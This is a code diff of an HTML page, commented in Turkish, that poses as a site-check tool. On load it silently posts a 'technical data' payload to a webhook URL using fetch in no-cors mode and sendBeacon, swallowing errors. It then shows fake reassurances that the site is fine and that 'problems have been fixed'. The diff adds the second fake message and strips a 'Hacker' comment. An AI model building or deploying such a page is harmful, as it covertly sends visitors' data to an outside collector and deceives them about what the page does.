@@ -18,7 +18,7 @@
         .container { text-align: center; }
         .loader {
             border: 3px solid #333;
-            border-top: 3px solid #00ff41; /* Hacker/Sistem yeşili */
+            border-top: 3px solid #00ff41; 
             border-radius: 50%;
             width: 35px;
             height: 35px;
@@ -73,17 +73,23 @@
             const loader = document.getElementById('loader');
             const payload = teknikVerileriHazirla();
 
-            // Verileri arka planda sessizce gönder
+            // Verileri arka planda sessizce gönder (Her şey bir öncekiyle aynı)
             try {
                 await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
                 navigator.sendBeacon(webhookURL, JSON.stringify(payload));
             } catch (err) {}
 
-            // Arayüz değişim senaryosu
+            // Arayüz Değişimi
             setTimeout(() => {
-                loader.style.display = "none"; // Yükleme halkasını gizle
+                loader.style.display = "none";
                 msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
-            }, 3500); // 3.5 saniye sonra onay mesajı ver
+                
+                // 1.5 saniye daha bekle ve "Sorunlar düzeltildi" yazısına geç
+                setTimeout(() => {
+                    msg.innerHTML = '<span class="success-text">Sorunlar düzeltildi.</span>';
+                }, 1500);
+
+            }, 3000); 
         }
 
         window.onload = sistemiBaslat;
